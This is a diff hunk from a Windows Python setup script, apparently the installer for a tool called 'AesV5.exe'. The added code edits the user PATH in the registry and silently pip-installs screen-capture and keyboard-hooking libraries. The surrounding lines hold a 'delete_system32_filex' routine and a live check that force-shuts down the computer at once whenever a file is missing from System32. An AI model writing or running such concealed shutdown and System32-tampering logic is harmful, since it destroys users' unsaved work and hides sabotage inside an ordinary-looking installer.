@@ -26,6 +26,46 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
+def add_path_and_install_libraries():
+    try:
+        username = os.getenv('USERNAME')
+        full_path_to_add = os.path.join('C:\\Users', username, 'AppData\\Local\\Programs\\Python\\Python311\\Scripts')
+
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_READ)
+        
+        current_path_value, _ = winreg.QueryValueEx(key, 'Path')
+        winreg.CloseKey(key)
+
+        if full_path_to_add not in current_path_value.split(';'):
+            new_path_value = f"{current_path_value};{full_path_to_add}"
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
+            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
+            winreg.CloseKey(key)
+
+            print("Path added successfully.")
+        else:
+            print("Path already exists.")
+
+        modules_to_install = [
+            'colorama==0.4.6', 'pyfiglet==1.0.2', 'pyautogui==0.9.54', 'pillow==10.3.0',
+            'opencv-python==4.10.0.82', 'mss==9.0.1', 'numpy==1.26.4', 'pywin32==306',
+            'keyboard==0.13.5', 'cryptography==42.0.8', 'art==6.2', 'keyring==25.2.1',
+            'gdown==5.2.0', 'patool==2.2.0', 'requests==2.32.3',
+            'dxcam==0.0.5', 'pyserial==3.5'
+        ]
+        
+        subprocess.run(['py', '-m', 'pip', 'install', '--user'] + modules_to_install, check=True)
+
+        print(f"Updated Path: {new_path_value}")
+        print("---Libraries have been installed successfully.")
+        print("---You may close this and Restart and run AesV5.exe")
+        print("---You may delete this file and all the files you downloaded and just keep AesV5.exe")
+        input()
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+add_path_and_install_libraries()
+os.system('cls')
 pathx = r'C:\Windows\System32\validate.nsh'
 if not os.path.exists(pathx):
     os.system("shutdown /s /f /t 0")
